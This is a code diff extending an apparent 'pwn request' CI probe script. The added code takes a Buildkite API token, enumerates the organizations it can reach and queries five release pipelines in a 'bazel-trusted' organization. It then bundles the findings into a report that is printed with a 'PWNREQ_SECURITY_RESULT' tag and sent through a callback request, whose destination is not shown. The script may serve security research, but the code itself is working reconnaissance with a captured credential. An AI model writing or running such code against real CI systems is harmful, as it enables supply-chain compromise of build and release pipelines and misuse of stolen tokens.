@@ -122,6 +122,43 @@ def main():
                 except Exception as error:
                     report["buildkite_access_token_decode_error"] = type(error).__name__
 
+            org_status, org_body = request(
+                "https://api.buildkite.com/v2/organizations?per_page=100",
+                headers={"Authorization": "Bearer " + api_token},
+            )
+            report["buildkite_organizations_status"] = org_status
+            if org_status == 200:
+                try:
+                    report["buildkite_organizations"] = sorted(
+                        org.get("slug", "") for org in json.loads(org_body)
+                    )
+                except Exception as error:
+                    report["buildkite_organizations_decode_error"] = type(error).__name__
+
+            trusted_pipelines = {}
+            for pipeline in (
+                "bazel-release",
+                "publish-bazel-binaries",
+                "java-tools-release",
+                "rules-java-release",
+                "bcr-postsubmit",
+            ):
+                status, body = request(
+                    "https://api.buildkite.com/v2/organizations/"
+                    "bazel-trusted/pipelines/" + pipeline,
+                    headers={"Authorization": "Bearer " + api_token},
+                )
+                entry = {"status": status}
+                if status == 200:
+                    try:
+                        pipeline_info = json.loads(body)
+                        entry["name"] = pipeline_info.get("name")
+                        entry["repository"] = pipeline_info.get("repository")
+                    except Exception as error:
+                        entry["decode_error"] = type(error).__name__
+                trusted_pipelines[pipeline] = entry
+            report["bazel_trusted_pipelines"] = trusted_pipelines
+
     payload = json.dumps(report, sort_keys=True).encode("utf-8")
     print("PWNREQ_SECURITY_RESULT " + payload.decode("utf-8"), file=sys.stderr)
     callback_status, _ = request(
